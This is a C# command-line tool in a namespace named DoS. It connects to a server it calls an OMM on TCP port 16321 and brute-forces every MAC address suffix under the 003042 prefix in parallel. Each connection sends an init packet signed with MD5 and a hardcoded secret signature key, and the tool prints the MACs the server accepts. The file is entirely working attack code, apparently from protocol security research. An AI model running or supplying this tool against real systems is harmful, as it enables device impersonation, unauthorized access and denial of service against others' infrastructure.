using System;
using System.Buffers.Binary;
using System.Net.Sockets;
using System.Security.Cryptography;
using System.Threading;
using System.Threading.Tasks;
using Mono.Options;
using RfpProxyLib;

namespace DoS
{
    class Program
    {
        private static string _omm;
        private static int _current = 0;
        static void Main(string[] args)
        {
            bool showHelp = false;
            var options = new OptionSet
            {
                {"o|omm=", "OMM ip address", x => _omm = x},
                {"h|help", "show help", x => showHelp = x != null},
            };
            try
            {
                if (options.Parse(args).Count > 0)
                {
                    showHelp = true;
                }
            }
            catch (OptionException ex)
            {
                Console.Error.Write("dos: ");
                Console.Error.WriteLine(ex.Message);
                Console.Error.WriteLine("Try 'dotnet dos.dll --help' for more information");
                return;
            }
            if (String.IsNullOrEmpty(_omm))
            {
                showHelp = true;
            }
            if (showHelp)
            {
                options.WriteOptionDescriptions(Console.Error);
                return;
            }
            using (new Timer(o =>
            {
                var percent = _current / (double) 0xffffff;
                Console.CursorLeft = 0;
                Console.Write($"{percent*100:F3}%");
            }, null, TimeSpan.FromSeconds(1), TimeSpan.FromSeconds(1)))
            {
                Parallel.For(0, 0xffffff, TestMac);
            }
        }

        private static readonly byte[] _init = HexEncoding.HexToByte((
            "01200110 00000001 00000000 003042ff ffff0000 00000000 00000000 00000000 00000000 00000000" +
            "00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000" +
            "00000000 00000000 00000000 00080201 00000000 00000000 00000000 00000000 00000000 00000000" +
            "00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000" +
            "00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000" +
            "00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000" +
            "00000000 00000000 00000000 00000000 00000000 ffffffff ffffffff ffffffff ffffffff").Replace(" ", String.Empty));

        private static readonly byte[] _signatureKey = HexEncoding.HexToByte(
            "e7adda3adb0521f3d3fbdf3a18ee8648" +
            "b47398b1570c2b45ef8d2a9180a1a32c" +
            "69284a9c97d444abf87f5c578f942821" +
            "4dd0183cba969dc5");

        private static void TestMac(int suffix)
        {
            var start = DateTime.Now;
            Interlocked.Increment(ref _current);
            using (var tcp = new TcpClient(AddressFamily.InterNetworkV6))
            {
                tcp.Connect(_omm, 16321);
                var socket = tcp.Client;
                socket.ReceiveTimeout = 10000;
                var auth = new byte[0x24];
                var init = _init.AsSpan().ToArray();
                BinaryPrimitives.WriteInt32LittleEndian(init.AsSpan(0xf), suffix);
                socket.Receive(auth, SocketFlags.None, out var error);
                if (error == SocketError.TimedOut)
                {
                    Console.WriteLine($"Timeout for MAC 003042{HexEncoding.ByteToHex(init.AsSpan(0xf,3))}");
                    return;
                }
                var sysAuth = auth.AsSpan(4);
                using (var md5 = MD5.Create())
                {
                    var data = new byte[sysAuth.Length + init.Length - 0x10 + _signatureKey.Length];
                    sysAuth.CopyTo(data);
                    init.CopyTo(data.AsSpan(sysAuth.Length));
                    _signatureKey.CopyTo(data.AsMemory(sysAuth.Length + init.Length - 0x10));
                    var hash = md5.ComputeHash(data);
                    hash.AsSpan().CopyTo(init.AsSpan(0x104));
                }
                socket.Send(init);
                var ack = new byte[8];
                var read = socket.Receive(ack);
                if (read != 0)
                {
                    Console.WriteLine($"Found valid MAC 003042{HexEncoding.ByteToHex(init.AsSpan(0xf,3))}");
                    Console.WriteLine($"Took {DateTime.Now.Subtract(start).TotalMilliseconds}ms");
                }
            }
        }
    }
}
